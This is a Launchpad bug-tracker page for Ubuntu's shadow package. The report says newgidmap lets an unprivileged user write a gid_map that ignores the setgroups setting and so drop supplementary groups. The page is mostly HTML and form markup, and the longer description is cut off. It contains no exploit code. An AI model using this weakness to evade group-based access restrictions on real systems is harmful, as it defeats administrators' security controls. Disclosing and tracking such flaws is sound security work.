<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" dir="ltr">
  <head>
<base href="https://bugs.launchpad.net/ubuntu/+source/shadow/+bug/1729357/+index" />

    <meta charset="UTF-8" />
    <title>Bug #1729357 “unprivileged user can drop supplementary groups” : Bugs : shadow package : Ubuntu</title>
    <link rel="shortcut icon" href="/@@/launchpad.png" />
    <link rel="canonical" href="https://bugs.launchpad.net/bugs/1729357" />
    
      <link rel="alternate" type="application/atom+xml" href="http://feeds.launchpad.net/bugs/1729357/bug.atom" title="Bug 1729357 Feed" />
    

    
  
  <link type="text/css" rel="stylesheet" media="screen, print" href="/+icing/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/combo.css" />


    

    
      <meta name="description" content="Distribution: Ubuntu 16.04.3 LTS
Kernel: 4.4.0-97-generic
uidmap package version: 1:4.2-3.1ubuntu5.3

The newgidmap setuid executable allows any user to write a single mapping line to the gid_map of a process whose identity is the same as the calling process, as long as that mapping line maps the process's own GID outside of the user namespace to GID 0 inside the user namespace.

Newgidmap will write the mapping regardless of the content of /proc/$process_being_mapped/setgroups, which will in..." />
      <meta property="og:description" content="Distribution: Ubuntu 16.04.3 LTS
Kernel: 4.4.0-97-generic
uidmap package version: 1:4.2-3.1ubuntu5.3

The newgidmap setuid executable allows any user to write a single mapping line to the gid_map of a process whose identity is the same as the calling process, as long as that mapping line maps the process's own GID outside of the user namespace to GID 0 inside the user namespace.

Newgidmap will write the mapping regardless of the content of /proc/$process_being_mapped/setgroups, which will in..." />
    

    
    
      <meta property="og:title" content="Bug #1729357 “unprivileged user can drop supplementary groups” : Bugs : shadow package : Ubuntu" />
      <meta property="og:type" content="website" />
      <meta property="og:image" content="/@@/launchpad.png" />
      <meta property="og:url" content="https://bugs.launchpad.net/bugs/1729357" />
      <meta property="og:site_name" content="Launchpad" />
    

    

    
  

  
  
  <script type="text/javascript">
    var LP = {
        cache: {},
        links: {}
    };
  </script>

  

  <script type="text/javascript">var cookie_scope = '; Path=/; Secure; Domain=.launchpad.net';</script>

   <script type="text/javascript" src="/+combo/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/?yui/yui/yui-min.js&amp;lp/meta.js&amp;yui/loader/loader-min.js"></script>
   <script type="text/javascript">
        var raw = null;
        if (LP.devmode) {
           raw = 'raw';
        }
        YUI.GlobalConfig = {
            combine: true,
            comboBase: '/+combo/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/?',
            root: 'yui/',
            filter: raw,
            debug: false,
            fetchCSS: false,
            maxURLLength: 2000,
            groups: {
                lp: {
                    combine: true,
                    base: '/+combo/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/?lp/',
                    comboBase: '/+combo/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/?',
                    root: 'lp/',
                    // comes from including lp/meta.js
                    modules: LP_MODULES,
                    fetchCSS: false
                }
            }
        }</script>

  <script type="text/javascript">
      // we need this to create a single YUI instance all events and code
      // talks across. All instances of YUI().use should be based off of
      // LPJS instead.
      var LPJS = new YUI();
  </script>



    <script id="base-layout-load-scripts" type="text/javascript">
        //<![CDATA[
        LPJS.use('base', 'node', 'console', 'event',
            'oop', 'lp', 'lp.app.foldables','lp.app.sorttable',
            'lp.app.inlinehelp', 'lp.app.links',
            'lp.bugs.bugtask_index', 'lp.bugs.subscribers',
            'lp.app.ellipsis', 'lp.code.branchmergeproposal.diff',
            'lp.views.global',
             function(Y) {

            Y.on("domready", function () {
                var global_view = new Y.lp.views.Global();
                global_view.render();

                Y.lp.app.sorttable.SortTable.init();
                Y.lp.app.inlinehelp.init_help();
                Y.lp.activate_collapsibles();
                Y.lp.app.foldables.activate();
                Y.lp.app.links.check_valid_lp_links();
            });

            Y.on('lp:context:web_link:changed', function(e) {
                  window.location = e.new_value;
            });
        });
        //]]>
    </script>
    <script id="base-helper-functions" type="text/javascript">
         //<![CDATA[
        // This code is pulled from lp.js that needs to be available on every
        // request. Pulling here to get it outside the scope of the YUI block.
        function setFocusByName(name) {
            // Focus the first element matching the given name which can be focused.
            var nodes = document.getElementsByName(name);
            var i, node;
            for (i = 0; i < nodes.length; i++) {
                node = nodes[i];
                if (node.focus) {
                    try {
                        // Trying to focus a hidden element throws an error in IE8.
                        if (node.offsetHeight !== 0) {
                            node.focus();
                        }
                    } catch (e) {
                        LPJS.use('console', function(Y) {
                            Y.log('In setFocusByName(<' +
                                node.tagName + ' type=' + node.type + '>): ' + e);
                        });
                    }
                    break;
                }
            }
        }

        function selectWidget(widget_name, event) {
          if (event && (event.keyCode === 9 || event.keyCode === 13)) {
              // Avoid firing if user is tabbing through or simply pressing
              // enter to submit the form.
              return;
          }
          document.getElementById(widget_name).checked = true;
        }
        //]]>
    </script>

    
      
      <script type="text/javascript" id="available-official-tags-js">var available_official_tags = ["a11y", "appstream", "bionic", "bisect-done", "bitesize", "cherry-pick", "community-security", "desktop-file", "disco", "dist-upgrade", "focal", "ftbfs", "groovy", "hirsute", "hw-specific", "impish", "jammy", "kernel-bug", "manpage", "metabug", "multiarch", "needs-bisect", "needs-design", "needs-packaging", "needs-reassignment", "package-conflict", "packaging", "patch", "patch-accepted-debian", "patch-accepted-upstream", "patch-forwarded-debian", "patch-forwarded-upstream", "patch-needswork", "patch-rejected", "patch-rejected-debian", "patch-rejected-upstream", "performing-bisect", "py2-removal", "qt4-removal", "regression-proposed", "regression-release", "regression-update", "string-fix", "suspend-resume", "systemd-boot", "testcase", "touch", "unmetdeps", "upgrade-software-version", "verification-done-bionic", "verification-done-focal", "verification-done-groovy", "verification-done-hirsute", "verification-done-impish", "verification-done-xenial", "verification-failed-bionic", "verification-failed-groovy", "verification-failed-impish", "verification-failed-xenial", "verification-needed-bionic", "verification-needed-focal", "verification-needed-groovy", "verification-needed-hirsute", "verification-needed-impish", "verification-needed-trusty", "verification-needed-xenial", "wayland", "xenial"];</script>
      <script type="text/javascript">
        LPJS.use('base', 'node', 'oop', 'event', 'lp.bugs.bugtask_index',
                  'lp.bugs.subscribers', 'lp.code.branchmergeproposal.diff',
                  'lp.app.comment', 'lp.services.messages.edit', function(Y) {
            Y.on('domready', function() {
                Y.lp.code.branchmergeproposal.diff.connect_diff_links();
                Y.lp.bugs.bugtask_index.setup_bugtask_index();
                Y.lp.bugs.bugtask_index.setup_bugtask_table();
                LP.cache.comment_context = LP.cache.bug;
                var cl = new Y.lp.app.comment.CommentList();
                cl.render();
                var sl = new Y.lp.bugs.subscribers.createBugSubscribersLoader({
                    container_box: '#other-bug-subscribers',
                    subscribers_details_view:
                        '/+bug-portlet-subscribers-details',
                    subscribe_someone_else_link: '.menu-link-addsubscriber'
                }, window);

                Y.lp.services.messages.edit.setup();
            });
         });
      </script>
      <style type="text/css">
        /* Align the 'add comment' link to the right of the comment box. */
        #add-comment-form textarea { width: 100%; }
        #add-comment-form { max-width: 60em; padding-bottom: 4em; }
        #add-comment-form .actions {float: right;}
        .buglink-summary dd { font-size: 10px; }
        a#privacy-link:link:hover, a#privacy-link:visited:hover {text-decoration:none;}
      </style>
      <style type="text/css">
        .yui3-overlay .value label  {
          /* It normally makes sense for form labels to be bold, but since
          this form consists only of radio buttons, there's nothing but labels
          so we just get wall-to-wall bold. */
          font-weight: normal !important;
        }
      </style>
    
    
  </head>

  <body id="document" itemscope="" itemtype="http://schema.org/WebPage" class="tab-bugs
      main_side
      public
      yui3-skin-sam">
          
          
    <div class="yui-d0">
      <div id="locationbar" class="login-logout">
        

<div id="logincontrol"><a href="https://bugs.launchpad.net/ubuntu/+source/shadow/+bug/1729357/+login">Log in / Register</a></div>



      </div><!--id="locationbar"-->

      <div id="watermark" class="watermark-apps-portlet">
        <div>
          <a href="https://launchpad.net/ubuntu"><img alt="" width="64" height="64" src="https://launchpadlibrarian.net/49558155/64_logo.png" /></a>
        </div>
        <div class="wide">
          <h2 id="watermark-heading"><a href="https://launchpad.net/ubuntu">Ubuntu</a><br /><a href="https://launchpad.net/ubuntu/+source/shadow">shadow package</a></h2>
        </div>
        
  <!-- Application Menu -->
  <ul class="facetmenu">
    
      
      <li class="overview"><a href="https://launchpad.net/ubuntu/+source/shadow">Overview</a></li>
      
    
    
      
      <li class="branches"><a href="https://code.launchpad.net/ubuntu/+source/shadow">Code</a></li>
      
    
    
      <li class="bugs active"><a href="https://bugs.launchpad.net/ubuntu/+source/shadow">Bugs</a></li>
      
      
    
    
      
      
      <li class="specifications disabled-tab"><span>Blueprints</span></li>
    
    
      
      <li class="translations"><a href="https://translations.launchpad.net/ubuntu/+source/shadow">Translations</a></li>
      
    
    
      
      <li class="answers"><a href="https://answers.launchpad.net/ubuntu/+source/shadow">Answers</a></li>
      
    
  </ul>

      </div>

      <div class="yui-t4">
        <div id="maincontent" class="yui-main">
          <div class="yui-b" dir="ltr">
            <div class="context-publication">
              
      <h1 id="edit-title">
<span class="yui3-editable_text-text ellipsis" style="max-width: 95%;">
    unprivileged user can drop supplementary groups
</span>
  
</h1>



    
              

              <div id="registration" class="registering">
                
      Bug #1729357 reported by
      <a href="https://launchpad.net/~craigpivotal" class="sprite person">Craig Furman</a>
      <time title="2017-11-01 14:33:01 UTC" datetime="2017-11-01T14:33:01.240353+00:00">on 2017-11-01</time>
    
              </div>
            </div>

            
            <div id="request-notifications">
              
            </div>

            
              <div>

      

      <div id="bug-is-duplicate">
          
      </div>
      

      <div style="float: right;">
        <span><a href="/+help-bugs/bug-heat.html" target="help" class="sprite flame">272</a></span>
      </div>

      


  
  
    <div class="actions">
      <span id="affectsmetoo" style="display: inline">This bug affects 2 people</span>
    </div>
  



    <table id="affected-software" class="listing">
      <thead>
        <tr>
          <th colspan="2">Affects</th>
          <th>Status</th>
          <th>Importance</th>
          <th>Assigned to</th>
          <th>Milestone</th>
        </tr>
      </thead>

      <tbody>
        
          
  <tr class="highlight" id="tasksummary2311191">
    <td>
      <a class="bugtask-expander" href="https://bugs.launchpad.net/ubuntu/+source/shadow/+bug/1729357/+editstatus">
        &#8203;
      </a>
    </td>
    
    <td>
      <span id="bugtarget-picker-tasksummary2311191">
        <span class="yui3-activator-data-box">
            <a class="sprite package-source" href="https://bugs.launchpad.net/ubuntu/+source/shadow" title="Latest release: 1:4.8.1-1ubuntu9, uploaded to main on 2021-07-13 08:24:08.763832+00:00 by William Wilson (jawn-smith), maintained by Ubuntu Developers (ubuntu-devel-discuss-lists)">shadow (Ubuntu)</a>
        </span>
        <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
          Edit
        </button>
        <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        
      </span>
    </td>

    

    
    <td style="width: 20%; vertical-align: middle">
      <div class="status-content" style="width: 100%; float: left">
        
        
          <a href="https://bugs.launchpad.net/ubuntu/+source/shadow/+bug/1729357/+editstatus" style="float: left" class="value statusCONFIRMED">Confirmed</a>
          <a href="https://bugs.launchpad.net/ubuntu/+source/shadow/+bug/1729357/+editstatus" style="margin-left: 3px">
            <img class="editicon" src="/@@/edit" />
          </a>
        
      </div>
    </td>

    
    <td style="width: 15em; vertical-align: middle">
      <div class="importance-content" style="width: 100%; float: left">
        <span style="float: left" class="value importanceUNDECIDED">Undecided</span>
      </div>
    </td>

    <td style="width:20%; margin: 0; padding: 0;
               vertical-align: middle; padding-left: 0.5em">
      

      
        <span id="assignee-picker-tasksummary2311191">
          <span class="yui3-activator-data-box">
            
            
              Unassigned
            
          </span>
          
          <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
            Edit
          </button>
          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        </span>
      
    </td>

    <td style="width: 20%; vertical-align: middle">
      <div class="milestone-content" style="width: 100%; float: left">
        
        <a class="value" href=""></a>
        
      </div>
    </td>

    
  </tr>

  
    <tr class="bugtask-collapsible-content hidden" id="task2311191">
     <td colspan="7"><form action="/ubuntu/+source/shadow/+bug/1729357/+editstatus" method="post" enctype="multipart/form-data">
  

  <p class="error message">
    You need to log in to change this bug's status.
  </p>
  
  <table class="summary" style="float: right; margin-left: 1em;">
    <tr>
      <th>Affecting:</th>
      <td><a href="/ubuntu/+source/shadow">shadow (Ubuntu)</a></td>
    </tr>
    <tr>
      <th>Filed here by:</th>
      <td><a href="https://launchpad.net/~craigpivotal" class="sprite person">Craig Furman</a></td>
    </tr>
    <tr>
      <th>When:</th>
      <td>
        <time title="2017-11-01 14:33:01 UTC" datetime="2017-11-01T14:33:01.240353+00:00">2017-11-01</time>
      </td>
    </tr>
    <tr>
      <th>Confirmed:</th>
      <td>
        <time title="2017-11-14 01:56:19 UTC" datetime="2017-11-14T01:56:19.567902+00:00">2017-11-14</time>
      </td>
    </tr>
    
    
    
  </table>
  <div class="field">
    <table>
      <tr>
        <td>
          <label for="ubuntu_shadow.target">Target</label>
        </td>
      </tr>
      <tr>
        <td>
          <table>
  <tr>
    <td>
      <label>
        <input class="radioType" checked="checked" id="ubuntu_shadow.target.option.package" name="ubuntu_shadow.target" type="radio" value="package" />
        Distribution
      </label>
    </td>
    <td>
      <select id="ubuntu_shadow.target.distribution" name="ubuntu_shadow.target.distribution" size="1" >
<option value="baltix">Baltix</option>
<option value="boss">BOSS</option>
<option value="charms">Juju Charms Collection</option>
<option value="elbuntu">Elbuntu</option>
<option value="guadalinex">Guadalinex</option>
<option value="guadalinexedu">Guadalinex Edu</option>
<option value="kiwilinux">Kiwi Linux</option>
<option value="nubuntu">nUbuntu</option>
<option value="pld-linux">PLD Linux</option>
<option value="tilix">Tilix</option>
<option value="tuxlab">tuXlab</option>
<option selected="selected" value="ubuntu">Ubuntu</option>
<option value="ubuntu-leb">Ubuntu Linaro Evaluation Build</option>
<option value="ubuntu-rtm">Ubuntu RTM</option>
</select>
<input name="ubuntu_shadow.target.distribution-empty-marker" type="hidden" value="1" />
    </td>
  </tr>
  <tr>
    <td align="right">
      <label for="ubuntu_shadow.target.option.package">
        Package
      </label>
    </td>
    <td>
      


    <input type="text" value="shadow" id="ubuntu_shadow.target.package"
                         name="ubuntu_shadow.target.package" size="20"
                         maxlength=""
                         onKeyPress="selectWidget(&#x27;ubuntu_shadow.target.option.package&#x27;, event)" style=""
                         class="" />

    
      
      <script type="text/javascript">
          LPJS.use('node', 'lp.app.picker', function(Y) {
              var text_input = Y.DOM.byId('ubuntu_shadow.target.package');
              var select_menu = Y.DOM.byId('ubuntu_shadow.target.package-suggestions');
              Y.lp.app.picker.connect_select_menu(
                  select_menu, text_input);
          });</script>
    

    <span class="hidden">(<a id="show-widget-ubuntu_shadow-target-package" href="#">Find&hellip;</a>)</span>
    <script>
    LPJS.use('node', 'lp.app.picker', function(Y) {
        var config = {"show_assign_me_button": false, "extra_no_results_message": null, "picker_type": "default", "selected_value_metadata": null, "remove_team_text": "Remove team", "selected_value": "shadow", "step_title": "Search by name", "header": "Select a package", "vocabulary_filters": [], "show_create_team": false, "input_element": "ubuntu_shadow.target.package", "assign_me_text": "Pick me", "remove_person_text": "Remove person", "show_remove_button": false, "vocabulary_name": "DistributionPackage", "show_widget_id": "show-widget-ubuntu_shadow-target-package"};
        var show_widget_id = 'show-widget-ubuntu_shadow-target-package';
        Y.lp.app.picker.addPicker(config, show_widget_id);
    });
    </script>
  



    </td>
  </tr>

  <tr>
    <td>
      <label>
        <input class="radioType" id="ubuntu_shadow.target.option.product" name="ubuntu_shadow.target" type="radio" value="product" />
       Project
      </label>
    </td>
    <td>
      


    <input type="text" value="" id="ubuntu_shadow.target.product"
                         name="ubuntu_shadow.target.product" size="20"
                         maxlength=""
                         onKeyPress="selectWidget(&#x27;ubuntu_shadow.target.option.product&#x27;, event)" style=""
                         class="" />

    
      
      <script type="text/javascript">
          LPJS.use('node', 'lp.app.picker', function(Y) {
              var text_input = Y.DOM.byId('ubuntu_shadow.target.product');
              var select_menu = Y.DOM.byId('ubuntu_shadow.target.product-suggestions');
              Y.lp.app.picker.connect_select_menu(
                  select_menu, text_input);
          });</script>
    

    <span class="hidden">(<a id="show-widget-ubuntu_shadow-target-product" href="#">Find&hellip;</a>)</span>
    <script>
    LPJS.use('node', 'lp.app.picker', function(Y) {
        var config = {"show_assign_me_button": false, "extra_no_results_message": null, "picker_type": "default", "selected_value_metadata": null, "remove_team_text": "Remove team", "selected_value": null, "step_title": "Search", "header": "Select a project", "vocabulary_filters": [], "show_create_team": false, "input_element": "ubuntu_shadow.target.product", "assign_me_text": "Pick me", "remove_person_text": "Remove person", "show_remove_button": false, "vocabulary_name": "Product", "show_widget_id": "show-widget-ubuntu_shadow-target-product"};
        var show_widget_id = 'show-widget-ubuntu_shadow-target-product';
        Y.lp.app.picker.addPicker(config, show_widget_id);
    });
    </script>
  



    </td>
  </tr>
</table>

          
        </td>
      </tr>
    </table>
    
    <table>
      <tr>
        <td>
          <label style="font-weight: bold" for="ubuntu_shadow.status">Status</label>
        </td>
        <td>
          <label style="font-weight: bold" for="ubuntu_shadow.importance">Importance</label>
        </td>
        
      </tr>
      <tr>
        <td><div>
<div class="value">
<select id="ubuntu_shadow.status" name="ubuntu_shadow.status" size="1" >
<option selected="selected" value="Confirmed">Confirmed</option>
</select>
</div>
<input name="ubuntu_shadow.status-empty-marker" type="hidden" value="1" />
</div></td>
        <td title="Changeable only by a project maintainer or bug supervisor">
          <span class="sprite read-only"></span>
          <span class="importanceUNDECIDED">Undecided</span>
        </td>
        
      </tr>
    </table>
    <table>
      <tr>
        <td>
          <label style="font-weight: bold" for="ubuntu_shadow.assignee">Assigned to</label>
        </td>
      </tr>
      <tr>
        <td colspan="2" style="white-space: nowrap">

  <table>
    <tr>
      <td style="padding: 0 2px 2px 0">
        <input type="radio" checked="checked" id="ubuntu_shadow.assignee.assign_to_nobody" name="ubuntu_shadow.assignee.option" value="ubuntu_shadow.assignee.assign_to_nobody" />
      </td>
      <td style="padding: 0">
        <label style="font-weight: normal" for="ubuntu_shadow.assignee.assign_to_nobody">
          Nobody
        </label>
      </td>
    </tr>
    <tr>
      <td style="padding: 0 2px 2px 0">
        <input type="radio" id="ubuntu_shadow.assignee.assign_to_me" name="ubuntu_shadow.assignee.option" value="ubuntu_shadow.assignee.assign_to_me" />
      </td>
      <td style="padding: 0">
        <label style="font-weight: normal" for="ubuntu_shadow.assignee.assign_to_me">
          Me
        </label>
      </td>
    </tr>
    
    
  </table>


</td>
      </tr>
    </table>
    
  </div>
  <div class="field">
    <div>
      <label style="font-weight: bold" for="ubuntu_shadow.comment_on_change">Comment on this change (optional)</label>
      <textarea cols="62" rows="4" id="ubuntu_shadow.comment_on_change" name="ubuntu_shadow.comment_on_change"></textarea>
    </div>
    <div>
      <label style="font-weight: normal">
        <input type="checkbox" name="subscribe" id="subscribe" value="Subscribe" />
        Email me about changes to this bug report
      </label>
    </div>
  </div>
  
</form>
</td>
    </tr>
  


        
        
          
  <tr id="tasksummary2348429">
    <td>
      <a class="bugtask-expander" href="https://bugs.launchpad.net/opensuse/+source/shadow/+bug/1729357/+editstatus">
        &#8203;
      </a>
    </td>
    
    <td>
      <span id="bugtarget-picker-tasksummary2348429">
        <span class="yui3-activator-data-box">
            <a class="sprite package-source" href="https://bugs.launchpad.net/opensuse/+source/shadow" title="No current release for this source package in openSUSE">shadow (openSUSE)</a>
        </span>
        <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
          Edit
        </button>
        <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        
      </span>
    </td>

    

    
    <td style="width: 20%; vertical-align: middle">
      <div class="status-content" style="width: 100%; float: left">
        <span style="float: left" class="value statusFIXRELEASED">Fix Released</span>
        
      </div>
    </td>

    
    <td style="width: 15em; vertical-align: middle">
      <div class="importance-content" style="width: 100%; float: left">
        <span style="float: left" class="value importanceMEDIUM">Medium</span>
      </div>
    </td>

    <td style="width:20%; margin: 0; padding: 0;
               vertical-align: middle; padding-left: 0.5em">
      
        <div style="text-decoration: none; padding: 0.25em">
          
            
              
              <a target="help" class="icon help" href="https://bugs.launchpad.net/bugs/1729357/+watch/127779/+error-help#CONNECTION_ERROR">
                <span class="sprite warning-icon" id="bugwatch-error-sprite" title="Launchpad couldn't connect to bugzilla.opensuse.org/."></span>
              </a>
            
          
          
          <a class="link-external" href="https://bugzilla.opensuse.org/show_bug.cgi?id=1081294">auto-bugzilla.opensuse.org #1081294</a>
        </div>
      

      
    </td>

    <td style="width: 20%; vertical-align: middle">
      
    </td>

    
  </tr>

  
    <tr class="bugtask-collapsible-content hidden" id="task2348429">
     <td colspan="7"><form action="/opensuse/+source/shadow/+bug/1729357/+editstatus" method="post" enctype="multipart/form-data">
  

  <p class="error message">
    You need to log in to change this bug's status.
  </p>
  
    
      <p class="error message">
        
          Launchpad couldn't connect to bugzilla.opensuse.org/.<br />
          <a target="help" class="help" href="https://bugs.launchpad.net/bugs/1729357/+watch/127779/+error-help#CONNECTION_ERROR">(what does this mean?)</a>
        
      </p>
    
    
  
  <table class="summary" style="float: right; margin-left: 1em;">
    <tr>
      <th>Affecting:</th>
      <td><a href="/opensuse/+source/shadow">shadow (openSUSE)</a></td>
    </tr>
    <tr>
      <th>Filed here by:</th>
      <td><a href="https://launchpad.net/~cyphar" class="sprite person">Aleksa Sarai</a></td>
    </tr>
    <tr>
      <th>When:</th>
      <td>
        <time title="2018-02-15 16:27:58 UTC" datetime="2018-02-15T16:27:58.220986+00:00">2018-02-15</time>
      </td>
    </tr>
    
    
    <tr>
      <th>Started work:</th>
      <td>
        <time title="2018-07-16 20:28:33 UTC" datetime="2018-07-16T20:28:33.596081+00:00">2018-07-16</time>
      </td>
    </tr>
    <tr>
      <th>Completed:</th>
      <td>
        <time title="2018-07-16 20:28:33 UTC" datetime="2018-07-16T20:28:33.596081+00:00">2018-07-16</time>
      </td>
    </tr>
  </table>
  <div class="field">
    <table>
      <tr>
        <td>
          <label for="opensuse_shadow.target">Target</label>
        </td>
      </tr>
      <tr>
        <td>
          <table>
  <tr>
    <td>
      <label>
        <input class="radioType" checked="checked" id="opensuse_shadow.target.option.package" name="opensuse_shadow.target" type="radio" value="package" />
        Distribution
      </label>
    </td>
    <td>
      <select id="opensuse_shadow.target.distribution" name="opensuse_shadow.target.distribution" size="1" >
<option value="baltix">Baltix</option>
<option value="boss">BOSS</option>
<option value="charms">Juju Charms Collection</option>
<option value="elbuntu">Elbuntu</option>
<option value="guadalinex">Guadalinex</option>
<option value="guadalinexedu">Guadalinex Edu</option>
<option value="kiwilinux">Kiwi Linux</option>
<option value="nubuntu">nUbuntu</option>
<option selected="selected" value="opensuse">openSUSE</option>
<option value="pld-linux">PLD Linux</option>
<option value="tilix">Tilix</option>
<option value="tuxlab">tuXlab</option>
<option value="ubuntu">Ubuntu</option>
<option value="ubuntu-leb">Ubuntu Linaro Evaluation Build</option>
<option value="ubuntu-rtm">Ubuntu RTM</option>
</select>
<input name="opensuse_shadow.target.distribution-empty-marker" type="hidden" value="1" />
    </td>
  </tr>
  <tr>
    <td align="right">
      <label for="opensuse_shadow.target.option.package">
        Package
      </label>
    </td>
    <td>
      


    <input type="text" value="shadow" id="opensuse_shadow.target.package"
                         name="opensuse_shadow.target.package" size="20"
                         maxlength=""
                         onKeyPress="selectWidget(&#x27;opensuse_shadow.target.option.package&#x27;, event)" style=""
                         class="" />

    
      
      <script type="text/javascript">
          LPJS.use('node', 'lp.app.picker', function(Y) {
              var text_input = Y.DOM.byId('opensuse_shadow.target.package');
              var select_menu = Y.DOM.byId('opensuse_shadow.target.package-suggestions');
              Y.lp.app.picker.connect_select_menu(
                  select_menu, text_input);
          });</script>
    

    <span class="hidden">(<a id="show-widget-opensuse_shadow-target-package" href="#">Find&hellip;</a>)</span>
    <script>
    LPJS.use('node', 'lp.app.picker', function(Y) {
        var config = {"show_assign_me_button": false, "extra_no_results_message": null, "picker_type": "default", "selected_value_metadata": null, "remove_team_text": "Remove team", "selected_value": "shadow", "step_title": "Search by name", "header": "Select a package", "vocabulary_filters": [], "show_create_team": false, "input_element": "opensuse_shadow.target.package", "assign_me_text": "Pick me", "remove_person_text": "Remove person", "show_remove_button": false, "vocabulary_name": "DistributionPackage", "show_widget_id": "show-widget-opensuse_shadow-target-package"};
        var show_widget_id = 'show-widget-opensuse_shadow-target-package';
        Y.lp.app.picker.addPicker(config, show_widget_id);
    });
    </script>
  



    </td>
  </tr>

  <tr>
    <td>
      <label>
        <input class="radioType" id="opensuse_shadow.target.option.product" name="opensuse_shadow.target" type="radio" value="product" />
       Project
      </label>
    </td>
    <td>
      


    <input type="text" value="" id="opensuse_shadow.target.product"
                         name="opensuse_shadow.target.product" size="20"
                         maxlength=""
                         onKeyPress="selectWidget(&#x27;opensuse_shadow.target.option.product&#x27;, event)" style=""
                         class="" />

    
      
      <script type="text/javascript">
          LPJS.use('node', 'lp.app.picker', function(Y) {
              var text_input = Y.DOM.byId('opensuse_shadow.target.product');
              var select_menu = Y.DOM.byId('opensuse_shadow.target.product-suggestions');
              Y.lp.app.picker.connect_select_menu(
                  select_menu, text_input);
          });</script>
    

    <span class="hidden">(<a id="show-widget-opensuse_shadow-target-product" href="#">Find&hellip;</a>)</span>
    <script>
    LPJS.use('node', 'lp.app.picker', function(Y) {
        var config = {"show_assign_me_button": false, "extra_no_results_message": null, "picker_type": "default", "selected_value_metadata": null, "remove_team_text": "Remove team", "selected_value": null, "step_title": "Search", "header": "Select a project", "vocabulary_filters": [], "show_create_team": false, "input_element": "opensuse_shadow.target.product", "assign_me_text": "Pick me", "remove_person_text": "Remove person", "show_remove_button": false, "vocabulary_name": "Product", "show_widget_id": "show-widget-opensuse_shadow-target-product"};
        var show_widget_id = 'show-widget-opensuse_shadow-target-product';
        Y.lp.app.picker.addPicker(config, show_widget_id);
    });
    </script>
  



    </td>
  </tr>
</table>

          
        </td>
      </tr>
    </table>
    
    <table>
      <tr>
        <td>
          <label style="font-weight: bold" for="opensuse_shadow.status">Status</label>
        </td>
        <td>
          <label style="font-weight: bold" for="opensuse_shadow.importance">Importance</label>
        </td>
        
      </tr>
      <tr>
        <td><span class="statusFIXRELEASED">Fix Released</span></td>
        <td title="Changeable only by a project maintainer or bug supervisor">
          <span class="sprite read-only"></span>
          <span class="importanceMEDIUM">Medium</span>
        </td>
        
      </tr>
    </table>
    <table>
      <tr>
        <td>
          <label style="font-weight: bold" for="opensuse_shadow.assignee">Assigned to</label>
        </td>
      </tr>
      <tr>
        <td colspan="2" style="white-space: nowrap"><i>unknown</i></td>
      </tr>
    </table>
    <table>
      <tr>
        <td>
          <label style="white-space: nowrap" for="opensuse_shadow.bugwatch">Remote Watch</label>
        </td>
      </tr>
      <tr>
        <td colspan="2" style="white-space: nowrap"><table><tr>

  <td style="padding: 0px" valign="top"><input class="radioType" id="opensuse_shadow.bugwatch.None" name="opensuse_shadow.bugwatch" type="radio" value="" /></td>
  <td style="padding: 0px">
    <label style="font-weight: normal" for="opensuse_shadow.bugwatch.None">
      None, the status of the bug is updated manually.
    </label>
  </td>

</tr>

<tr>

  <td style="padding: 0px" valign="top"><input class="radioType" id="opensuse_shadow.bugwatch.0" name="opensuse_shadow.bugwatch" type="radio" value="" /></td>
  <td style="padding: 0px">
    <label style="font-weight: normal" for="opensuse_shadow.bugwatch.0">
      None, the status of the bug is updated manually.
    </label>
  </td>

</tr>

<tr>

  <td style="padding: 0px" valign="top"><input class="radioType" checked="checked" id="opensuse_shadow.bugwatch.1" name="opensuse_shadow.bugwatch" type="radio" value="127779" /></td>
  <td style="padding: 0px">
    <label style="font-weight: normal" for="opensuse_shadow.bugwatch.1">
      bugzilla.opensuse.org/ <a href="https://bugzilla.opensuse.org/show_bug.cgi?id=1081294">#1081294</a>
    </label>
  </td>

</tr>

<tr>

  <td style="padding: 0px" valign="top"><input class="radioType" id="opensuse_shadow.bugwatch.NEW" name="opensuse_shadow.bugwatch" type="radio" value="NEW" /></td>
  <td style="padding: 0px">
    <label style="font-weight: normal" for="opensuse_shadow.bugwatch.NEW">
      <div>URL: <input class="urlTextType textType" id="opensuse_shadow.url" name="opensuse_shadow.url" size="44" type="text" value="" onKeyPress="selectWidget('opensuse_shadow.bugwatch.NEW', event)" /></div>
    </label>
  </td>

</tr>
</table>
<input name="opensuse_shadow.bugwatch-empty-marker" type="hidden" value="1" /></td>
      </tr>
      <tr>
        <td class="formHelp" colspan="2">
        The information about this bug in Launchpad is
        automatically pulled daily from the remote bug.
        
          
              This information was last pulled
              <b><time title="2021-10-30 12:58:07 UTC" datetime="2021-10-30T12:58:07.484866+00:00">6 hours ago</time></b>.
          
          
        
        </td>
      </tr>
    </table>
  </div>
  <div class="field">
    <div>
      <label style="font-weight: bold" for="opensuse_shadow.comment_on_change">Comment on this change (optional)</label>
      <textarea cols="62" rows="4" id="opensuse_shadow.comment_on_change" name="opensuse_shadow.comment_on_change"></textarea>
    </div>
    <div>
      <label style="font-weight: normal">
        <input type="checkbox" name="subscribe" id="subscribe" value="Subscribe" />
        Email me about changes to this bug report
      </label>
    </div>
  </div>
  
</form>
</td>
    </tr>
  


        
      </tbody>

    </table>



<div class="actions">
  
    <span id="also-affects-product" class="">
    <a class="menu-link-addupstream sprite add" href="https://bugs.launchpad.net/ubuntu/+source/shadow/+bug/1729357/+choose-affected-product">Also affects project</a>
        <a href="/+help-bugs/also-affects-project-help.html" target="help" class="sprite maybe action-icon">(?)</a>
    </span>
    <span id="also-affects-package" class="">
    <a class="menu-link-adddistro sprite add" href="https://bugs.launchpad.net/ubuntu/+source/shadow/+bug/1729357/+distrotask">Also affects distribution/package</a>
    </span>
    <a class="menu-link-nominate sprite milestone" href="https://bugs.launchpad.net/ubuntu/+source/shadow/+bug/1729357/+nominate">Nominate for series</a>
    
  

</div>




      <div id="maincontentsub">
        <div class="top-portlet">

      <div itemprop="mainContentOfPage" class="report">
        

        <div>
  <div class="lazr-multiline-edit" id="edit-description">
